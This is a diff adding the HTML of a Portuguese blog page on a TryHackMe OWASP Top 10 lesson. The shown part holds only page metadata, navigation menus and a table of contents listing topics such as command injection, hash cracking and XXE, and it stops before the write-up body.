@@ -1,0 +1,1362 @@
+<!DOCTYPE html>
+<html lang="pt" dir="ltr"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="robots" content="noindex, nofollow" />
+  <link rel="icon shortcut" href="/favicon.ico" sizes="32x32" />
+<link rel="icon" href="/favicon.svg" type="image/svg+xml" id="favicon-svg" />
+<link rel="icon" href="/favicon-16x16.png" type="image/png" sizes="16x16" />
+<link rel="icon" href="/favicon-32x32.png" type="image/png" sizes="32x32" />
+<link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180" />
+<link fetchpriority="low" href="/site.webmanifest" rel="manifest" />
+<title>OWASP Top 10 - THM – Alex Paulino</title>
+  <meta name="description" content="Introdução Nesta aula, são ensinados os métodos para explorar cada vulnerabilidade do OWASP Top 10. Documentarei e detalharei as etapas de cada uma das vulnerabilidades mencionadas na aula.
+Para acessar a aula clique aqui OWASP TOP 10
+Injeção É uma vulnerabilidade comum nas aplicações atuais. A falha ocorre porque a entrada de dados enviada pelo usuário é interpretada como comandos ou parâmetros, sem validação ou sanitização dos dados enviados. Assim, o atacante pode executar comandos arbitrários no sistema, como acessar, modificar e até mesmo deletar informações contidas no servidor. Exemplos de códigos podem ser injetados." /><link rel="canonical" href="http://localhost:1313/posts/2025/2025-01-17-owasptop10-2020/" itemprop="url" />
+
+<meta property="og:title" content="OWASP Top 10 - THM">
+<meta
+  property="og:description"
+  content="
+    
+      Introdução
+    Nesta aula, são ensinados os métodos para explorar cada vulnerabilidade do OWASP Top 10. Documentarei e detalharei as etapas de cada uma das vulnerabilidades mencionadas na aula.
+Para acessar a aula clique aqui OWASP TOP 10
+Injeção
+    É uma vulnerabilidade comum nas aplicações atuais. A falha ocorre porque a entrada de dados enviada pelo usuário é interpretada como comandos ou parâmetros, sem validação ou sanitização dos dados enviados. Assim, o atacante pode executar comandos arbitrários no sistema, como acessar, modificar e até mesmo deletar informações contidas no servidor. Exemplos de códigos podem ser injetados.
+    
+  ">
+<meta
+  property="og:type"
+  content="
+    article
+  ">
+<meta property="og:url" content="http://localhost:1313/posts/2025/2025-01-17-owasptop10-2020/"><meta property="article:section" content="posts">
+
+<meta
+  property="article:published_time"
+  content="2025-01-05T10:44:00-03:00">
+
+
+<meta
+  property="article:modified_time"
+  content="2025-01-05T10:44:00-03:00">
+
+
+
+	<meta itemprop="name" content="OWASP Top 10 - THM">
+	<meta itemprop="description" content="Introdução Nesta aula, são ensinados os métodos para explorar cada vulnerabilidade do OWASP Top 10. Documentarei e detalharei as etapas de cada uma das vulnerabilidades mencionadas na aula.
+Para acessar a aula clique aqui OWASP TOP 10
+Injeção É uma vulnerabilidade comum nas aplicações atuais. A falha ocorre porque a entrada de dados enviada pelo usuário é interpretada como comandos ou parâmetros, sem validação ou sanitização dos dados enviados. Assim, o atacante pode executar comandos arbitrários no sistema, como acessar, modificar e até mesmo deletar informações contidas no servidor. Exemplos de códigos podem ser injetados.">
+	<meta itemprop="datePublished" content="2025-01-05T10:44:00-03:00">
+	<meta itemprop="dateModified" content="2025-01-05T10:44:00-03:00">
+	<meta itemprop="wordCount" content="3773">
+	<meta itemprop="keywords" content="Owasp,Tryhackme,Web,Xml">
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:title" content="OWASP Top 10 - THM">
+	<meta name="twitter:description" content="Introdução Nesta aula, são ensinados os métodos para explorar cada vulnerabilidade do OWASP Top 10. Documentarei e detalharei as etapas de cada uma das vulnerabilidades mencionadas na aula.
+Para acessar a aula clique aqui OWASP TOP 10
+Injeção É uma vulnerabilidade comum nas aplicações atuais. A falha ocorre porque a entrada de dados enviada pelo usuário é interpretada como comandos ou parâmetros, sem validação ou sanitização dos dados enviados. Assim, o atacante pode executar comandos arbitrários no sistema, como acessar, modificar e até mesmo deletar informações contidas no servidor. Exemplos de códigos podem ser injetados.">
+<link href="/css/compiled/main.css" rel="stylesheet" />
+    <link href="/css/variables.css" rel="stylesheet" />
+    <link href="/css/custom.css" rel="stylesheet" />
+
+  
+<script src="/js/main-head.js" integrity=""></script>
+
+  
+  
+  </head>
+<body>
+    <a href="#content" class="hx:sr-only hx:focus-visible:not-sr-only hx:focus-visible:fixed hx:focus-visible:z-50 hx:focus-visible:top-2 hx:focus-visible:left-2 hx:focus-visible:bg-primary-500 hx:focus-visible:text-white hx:focus-visible:px-4 hx:focus-visible:py-2 hx:focus-visible:rounded-md hx:focus-visible:text-sm hx:focus-visible:font-medium">Saltar para o conteúdo</a><div class="hextra-nav-container hx:sticky hx:top-0 hx:z-20 hx:w-full hx:bg-transparent hx:print:hidden">
+  <div
+    class="hextra-nav-container-blur hx:pointer-events-none hx:absolute hx:z-[-1] hx:h-full hx:w-full hx:bg-white hx:dark:bg-dark hx:shadow-[0_2px_4px_rgba(0,0,0,.02),0_1px_0_rgba(0,0,0,.06)] hx:contrast-more:shadow-[0_0_0_1px_#000] hx:dark:shadow-[0_-1px_0_rgba(255,255,255,.1)_inset] hx:contrast-more:dark:shadow-[0_0_0_1px_#fff]"
+  ></div>
+
+  <nav class="hextra-max-navbar-width hx:mx-auto hx:flex hx:items-center hx:justify-end hx:gap-1 hx:md:gap-2 hx:h-[var(--hextra-navbar-height)] hx:px-6">
+    <a class="hx:flex hx:items-center hx:hover:opacity-75 hx:ltr:mr-auto hx:rtl:ml-auto" href="/">
+    <img class="hx:mr-2 hx:block hx:dark:hidden" src="/images/logo.svg" alt="Logo" height="20" width="20" />
+    <img class="hx:mr-2 hx:hidden hx:dark:block" src="/images/logo.svg" alt="Dark Logo" height="20" width="20" />
+    <span class="hx:mr-2 hx:font-extrabold hx:inline hx:select-none">Alex Paulino</span>
+</a>
+<button
+    type="button"
+    class="hextra-search-trigger"
+    data-search-open
+    aria-haspopup="dialog"
+    aria-controls="hextra-search-dialog"
+    aria-label="Procurar..."
+  ><svg class="hextra-search-trigger-icon" focusable="false" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg><span class="hextra-search-trigger-label">Procurar...</span>
+    <kbd class="hextra-search-trigger-kbd">CTRL K</kbd>
+  </button><a
+  title=""
+  href="/about/"
+  
+  class="hx:text-sm hx:contrast-more:text-gray-700 hx:contrast-more:dark:text-gray-100 hx:relative hx:-ml-2 hx:hidden hx:whitespace-nowrap hx:p-2 hx:md:inline-flex hx:items-center hx:gap-1 hx:text-gray-600 hx:hover:text-gray-800 hx:dark:text-gray-400 hx:dark:hover:text-gray-200"
+><span class="hx:text-center">Sobre</span>
+</a>
+          <a class="hx:p-1 hx:md:p-2 hx:text-current" target="_blank" rel="noreferrer" href="https://github.com/alxpas" title="GitHub"><svg height=24 fill="currentColor" viewBox="3 3 18 18">
+  <path d="M12 3C7.0275 3 3 7.12937 3 12.2276C3 16.3109 5.57625 19.7597 9.15374 20.9824C9.60374 21.0631 9.77249 20.7863 9.77249 20.5441C9.77249 20.3249 9.76125 19.5982 9.76125 18.8254C7.5 19.2522 6.915 18.2602 6.735 17.7412C6.63375 17.4759 6.19499 16.6569 5.8125 16.4378C5.4975 16.2647 5.0475 15.838 5.80124 15.8264C6.51 15.8149 7.01625 16.4954 7.18499 16.7723C7.99499 18.1679 9.28875 17.7758 9.80625 17.5335C9.885 16.9337 10.1212 16.53 10.38 16.2993C8.3775 16.0687 6.285 15.2728 6.285 11.7432C6.285 10.7397 6.63375 9.9092 7.20749 9.26326C7.1175 9.03257 6.8025 8.08674 7.2975 6.81794C7.2975 6.81794 8.05125 6.57571 9.77249 7.76377C10.4925 7.55615 11.2575 7.45234 12.0225 7.45234C12.7875 7.45234 13.5525 7.55615 14.2725 7.76377C15.9937 6.56418 16.7475 6.81794 16.7475 6.81794C17.2424 8.08674 16.9275 9.03257 16.8375 9.26326C17.4113 9.9092 17.76 10.7281 17.76 11.7432C17.76 15.2843 15.6563 16.0687 13.6537 16.2993C13.98 16.5877 14.2613 17.1414 14.2613 18.0065C14.2613 19.2407 14.25 20.2326 14.25 20.5441C14.25 20.7863 14.4188 21.0746 14.8688 20.9824C16.6554 20.364 18.2079 19.1866 19.3078 17.6162C20.4077 16.0457 20.9995 14.1611 21 12.2276C21 7.12937 16.9725 3 12 3Z"></path>
+</svg>
+<span class="hx:sr-only">GitHub</span>
+          </a>
+          <a class="hx:p-1 hx:md:p-2 hx:text-current" target="_blank" rel="noreferrer" href="https://www.linkedin.com/in/alexpaulino/" title="LinkedIn"><svg height=24 xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="currentColor" d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037c-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85c3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065a2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span class="hx:sr-only">LinkedIn</span>
+          </a><button type="button" aria-label="Menu" aria-expanded="false" class="hextra-hamburger-menu hx:cursor-pointer hx:-mr-1 hx:rounded-sm hx:p-1 hx:active:bg-gray-400/20 hx:md:hidden hx:hextra-focus-visible-inset"><svg height=24 fill="none" viewBox="0 0 24 24" stroke="currentColor"><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 8H20"></path></g><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16H20"></path></g></svg></button>
+  </nav>
+</div>
+
+  <div class="hx:mx-auto hx:flex hextra-max-page-width">
+    <aside class="hextra-sidebar-container hx:flex hx:flex-col hx:print:hidden hx:md:top-[var(--hextra-navbar-height)] hx:md:shrink-0 hx:md:w-64 hx:md:self-start hx:max-md:[transform:translate3d(0,-100%,0)] hx:md:hidden hx:xl:block">
+  <div class="hextra-scrollbar hx:overflow-y-auto hx:overflow-x-hidden hx:p-4 hx:grow hx:md:h-[calc(100vh-var(--hextra-navbar-height)-var(--menu-height))]">
+    <ul class="hx:flex hx:flex-col hx:gap-1 hx:md:hidden">
+      
+      <li><div class="hextra-sidebar-item hx:group hx:relative hx:flex hx:items-center" data-active="false">
+    <a
+      class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:grow hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:hextra-focus-visible-inset hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+      href="/about/"
+      
+    >
+      <span class="hx:min-w-0 [word-break:break-word]">Sobre</span>
+    </a>
+  </div></li>
+    </ul>
+
+    <div class="hx:max-xl:hidden hx:h-0 hx:w-64 hx:shrink-0"></div></div>
+  
+  
+    <div class="hx:md:hidden hx:justify-end hx:sticky hx:bottom-0 hx:max-h-(--menu-height) hx:bg-white hx:dark:bg-dark hx:mx-4 hx:py-4 hx:shadow-[0_-12px_16px_#fff] hx:flex hx:items-center hx:gap-2 hx:border-gray-200 hx:dark:border-neutral-800 hx:dark:shadow-[0_-12px_16px_#111] hx:contrast-more:border-neutral-400 hx:contrast-more:shadow-none hx:contrast-more:dark:shadow-none hx:border-t" data-toggle-animation="show"><div class="hx:flex hx:justify-items-start hx:grow">
+    <button
+      title="Mudar a língua"
+      data-state="closed"
+      data-location=""
+      class="hextra-language-switcher hx:cursor-pointer hx:rounded-md hx:text-left hx:font-medium hx:h-7 hx:px-2 hx:text-xs hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:grow"
+      type="button"
+      aria-label="Mudar a língua"
+      aria-expanded="false"
+      aria-haspopup="menu"
+    >
+      <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/></svg><span>Português</span></div>
+    </button>
+    <ul
+      class="hextra-language-options hx:hidden hx:z-20 hx:max-h-64 hx:overflow-auto hx:rounded-lg hx:border hx:border-gray-200 hx:bg-white hx:p-1 hx:text-sm hx:shadow-lg hx:dark:border-neutral-700 hx:dark:bg-neutral-900"
+      style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+      role="menu"
+    >
+      <li role="none" class="hx:flex hx:flex-col">
+          <a
+            href="/posts/2025/2025-01-17-owasptop10-2020/"
+            role="menuitem"
+            class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9"
+          >Português<span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span></a>
+        </li>
+      <li role="none" class="hx:flex hx:flex-col">
+          <a
+            href="/en/"
+            role="menuitem"
+            class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9"
+          >English</a>
+        </li>
+      </ul>
+  </div><div class="hx:flex hx:justify-items-start hx:group" data-theme="light">
+  <button
+    title="Mudar tema"
+    data-state="closed"
+    data-location="bottom-right"
+    class="hextra-theme-toggle hx:cursor-pointer hx:rounded-md hx:text-left hx:font-medium hx:h-7 hx:px-2 hx:text-xs hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:font-medium hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:grow"
+    type="button"
+    aria-label="Mudar tema"
+    aria-expanded="false"
+    aria-haspopup="menu"
+  >
+    <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg><svg height=12 class="hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg><svg height=12 class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"  fill="currentColor">
+  <path d="M 11.996094,2 C 6.4986225,2.0192368 2.03125,6.5024993 2.03125,12 c 0,5.497501 4.4673725,9.980763 9.964844,10 H 12 12.0039 c 5.497471,-0.01924 9.964844,-4.502499 9.964844,-10 0,-5.4975007 -4.467373,-9.9807632 -9.964844,-10 H 12 Z M 12,4 c 4.417218,0.017598 7.96875,3.5822356 7.96875,8 0,4.417764 -3.551532,7.982402 -7.96875,8 z" />
+</svg>
+</div>
+  </button>
+  <ul
+    class="hextra-theme-toggle-options hx:hidden hx:z-20 hx:max-h-64 hx:overflow-auto hx:rounded-lg hx:border hx:border-gray-200 hx:bg-white hx:p-1 hx:text-sm hx:shadow-lg hx:dark:border-neutral-700 hx:dark:bg-neutral-900"
+    style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+    data-theme="light"
+    role="menu"
+  >
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="true"
+        tabindex="-1"
+        data-item="light"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Claro
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="false"
+        tabindex="-1"
+        data-item="dark"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Escuro
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="false"
+        tabindex="-1"
+        data-item="system"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Sistema
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+  </ul>
+</div>
+</div></aside>
+    
+<nav class="hextra-toc hx:order-last hx:hidden hx:w-64 hx:shrink-0 hx:xl:block hx:print:hidden hx:px-4" aria-label="Índice">
+    <div class="hextra-scrollbar hx:sticky hx:top-[var(--hextra-navbar-height)] hx:overflow-y-auto hx:pr-4 hx:pt-6 hx:text-sm [hyphens:auto] hx:max-h-[calc(100vh-var(--hextra-navbar-height)-env(safe-area-inset-bottom))] hx:ltr:-mr-4 hx:rtl:-ml-4"><p class="hx:mb-4 hx:font-semibold hx:tracking-tight">Nesta página</p><ul>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#introdu%c3%a7%c3%a3o">Introdução
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#inje%c3%a7%c3%a3o">Injeção
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#command-injection">Command Injection
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#perguntas">Perguntas
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#autentica%c3%a7%c3%a3o-quebrada">Autenticação quebrada
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#pr%c3%a1tica">Prática
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#exposi%c3%a7%c3%a3o-de-dados-sens%c3%adveis">Exposição de dados sensíveis
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#banco-de-dados">Banco de dados
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#quebra-de-hash">Quebra de hash
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#desafio">Desafio
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#xxe">XXE
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#entidade-externa-xml-extensible-markup-language">Entidade externa XML (eXtensible Markup Language)
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#porque-usar-xml-">Porque usar XML ?
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#sintaxe">Sintaxe
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-12 hx:rtl:pr-12 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#perguntas-1">Perguntas
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#dtd-document-type-definition">DTD (Document Type Definition)
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#perguntas-2">Perguntas
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
